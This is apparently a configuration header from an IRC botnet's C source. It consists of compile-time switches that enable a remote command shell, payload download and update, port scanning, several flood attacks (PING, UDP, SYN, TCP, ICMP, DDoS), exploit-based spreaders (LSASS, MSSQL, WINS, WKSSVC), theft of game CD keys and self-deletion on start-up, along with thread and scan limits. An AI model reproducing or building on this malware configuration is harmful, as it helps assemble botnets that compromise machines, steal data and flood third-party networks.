// #define NO_IDENT      // disables Ident server
// #define NO_NETINFO    // disables Network info function
// #define NO_REMOTECMD  // disables Remote Command Shell function
// #define NO_DOWNLOAD   // disables Downloading/updating functions
// #define NO_VISIT      // disables Visiting URLs
#define NO_CONNCHECK  // disables Check for internet connection
// #define NO_BOTVERSION // disables Bot version
// #define NO_SCAN       // disables Port scanner
// #define NO_PING       // disables PING Flood
// #define NO_UDP        // disables UDP Flood
// #define NO_SYN        // disables SYN Flood
// #define NO_TCP        // disables TCP Flood
// #define NO_ICMP       // disables ICMP Flood
// #define NO_DDOS       // disables DDOS Flood
// #define NO_REDIRECT   // disables Port Redirect functions
 #define NO_RLOGIN     // disables RLOGIN daemon functions
// #define NO_HTTP       // disables HTTP daemon functions
//#define NO_TFTP       // disables TFTP daemon functions
// #define NO_CDKEYS     // disables Game cd key checks
// #define NO_WILDCARD   // disables Wildcard authost
// #define NO_LSASS      // disables LSASS Spreader

// #define NO_EHANDLER   // disables Exception Handler function
 #define NO_CRASH      // disables Crash function
#define NO_REALNICK   // disables Real nick function
// #define NO_MIRCNICK   // disables mIRC nick prefix
// #define NO_MODEONCONN // disables setting user modes on-connect
#define NO_REGISTRY   // disables Registry Monitor on startup function
// #define NO_MELT       // disables file melt (delete) on start-up
#define NO_CRYPT      // disables Crypted Strings (disabled when using DUMP_ENCRYPT)
// #define DUMP_ENCRYPT  // enables encrypted string dump (enable for setup only!!)
//#define DEBUG_CRYPT   // enables bot string dump in order to try to debug the Crypt() function
// #define DEBUG_LOGGING // enables protocol dumping to a log file for testing purposes
// #define DEBUG_CONSOLE // enables debugging console for stdout/stderr for testing purposes

//#define NO_WINS
//#define NO_MSSQL
//#define NO_LSASS2
//#define NO_WKSSVC
#define NO_AUSCAN

#ifdef DUMP_ENCRYPT
#define NO_CRYPT
#endif

#define IRCLINE			512
#define MAXTHREADS		900
#define MAXALIASES		16
#define LOGSIZE			128
#define LOGLINE			128
#define MAXLOGINS		3
#define MAX_LINES		500
#define MAXSCANTHRD		600
#define MAXSCANTIME		4000
#define MAXHOSTNAME		255
#define BLOCKSIZE		512
#define FLOOD_DELAY		2000
#define MAXSTRLEN		500
#define MAXNICKLEN		28
#define MAXPINGSIZE		65500
#define MAXTOKENS		32

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#define addpredefinedaliases()


